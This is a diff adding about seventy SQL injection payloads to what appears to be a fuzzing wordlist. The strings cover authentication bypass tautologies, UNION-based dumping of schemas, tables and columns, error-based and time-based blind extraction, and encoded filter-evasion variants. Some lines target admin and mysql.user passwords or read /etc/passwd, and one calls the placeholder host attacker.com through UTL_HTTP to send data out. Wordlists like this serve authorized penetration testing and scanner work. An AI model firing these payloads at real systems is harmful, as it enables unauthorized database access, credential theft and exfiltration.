@@ -89,3 +89,72 @@ admin%27%20--%20
 '+UNION+SELECT+BANNER,+NULL+FROM+v$version--
 '+UNION+SELECT+'abc','def'#
 '+UNION+SELECT+@@version,+NULL#
+' or 1=1-- -
+'/**/or/**/1=1-- -
+' or 1=1--+
+' or 1=1--#
+' or 1=1--%00
+' oorr 1==1#
+' || '1'='1
+' or 'x' like 'x
+' or 'x%'='x%
+' oRder/*comment*/by 1--
+' or 1=1 LIMIT 1 OFFSET 0--
+' or 1=1--+
+' or sleep(5)#
+' and ascii(substr((select user()),1,1))=114--+
+' union all select null,null,null,null--
+') or (SELECT 1)=1 --
+') or (SELECT 1 FROM DUAL WHERE 1=1)--
+'))/**/or/**/(('x'))=(('x
+') or (select 1 from dual where '1'='1')--
+'+OR+1=1--
+'+UNION+SELECT+NULL,NULL,NULL--
+'%27%20UNION%20SELECT%201,2,group_concat(schema_name)%20FROM%20information_schema.schemata--%20
+'%27%20UNION%20SELECT%201,2,group_concat(table_name)%20FROM%20information_schema.tables--%20
+'%27%20UNION%20SELECT%201,2,group_concat(column_name)%20FROM%20information_schema.columns%20WHERE%20table_name='users'--%20
+' and updatexml(null,concat(0x3a,user()),null)--
+' and extractvalue(1,concat(0x3a,database()))--
+' union select version(),user()-- -
+'||(SELECT password FROM users WHERE username='admin')||
+'||(SELECT hex(load_file('/etc/passwd')))||
+'||(SELECT password FROM mysql.user LIMIT 1 OFFSET 1)||
+' or 1=1%23
+') and 1=1 -- -
+')) and (select count(*) from users) > 0 --
+' + benchmark(1000000,md5(1))--
+' AND LENGTH(database())=8--
+'||UTL_HTTP.REQUEST('http://attacker.com')--
+'||(SELECT COUNT(*) FROM information_schema.tables)||
+' OR EXISTS(SELECT * FROM users WHERE username='admin')--
+'||CAST((SELECT password FROM users LIMIT 1) AS INT)=1
+%2527%2520OR%25201%253D1--%2520
+%27+UNION+ALL+SELECT+NULL,NULL--+
+%27%20AND%20%28SELECT%201%20FROM%20DUAL%20WHERE%201=1%29=1--%20
+%27%20AND%20MID%28VERSION%28%29,1,1%29=5--%20
+%27/**/OR/**/1=1--+
+%27+AND+1=0+UNION+ALL+SELECT+NULL,version%28%29--+
+%27+AND+1=0+UNION+ALL+SELECT+NULL,database%28%29--+
+%27+AND+1=0+UNION+ALL+SELECT+user%28%29,NULL--+
+%27%20AND%20%28SELECT%201%20FROM%20DUAL%20WHERE%20ascii%28substring%28user%28%29,1,1%29%29%3D114%29--%20
+%27%20AND%20%28SELECT%20IF%28%28SELECT%20user%28%29%29%20LIKE%20%27r%25%27,1,0%29%29--%20
+'/*!or*/1=1-- -
+'/**/or/**/1=1-- -
+'||1=1#
+'||'1'='1'#
+'%df%27 or 1=1--%20
+'%27 or 1=1 having 1=1--%20
+' OR 1 GROUP BY CONCAT(user, FLOOR(RAND(0)*2)) HAVING MIN(0) -- 
+'||(SELECT+password+FROM+users+WHERE+username='admin')||
+' or 'a'='a' --+
+' +OR+''=''--
+'||(SELECT schema_name FROM information_schema.schemata LIMIT 1 OFFSET 0)||'
+'||(SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1)||'
+' AND SLEEP(5)-- 
+" AND SLEEP(5)-- 
+') AND SLEEP(5)--
+' AND IF(1=1,SLEEP(5),0)-- 
+" AND IF(1=1,BENCHMARK(5000000,MD5(1)),0)-- 
+' AND (SELECT 1 FROM dual WHERE 1=1 AND SLEEP(5))-- 
+1 AND IF((SELECT SUBSTRING(@@version,1,1))='5',SLEEP(5),0)-- 
+' AND (SELECT 1 FROM mysql.user WHERE LENGTH(user)>1 AND SLEEP(5))--
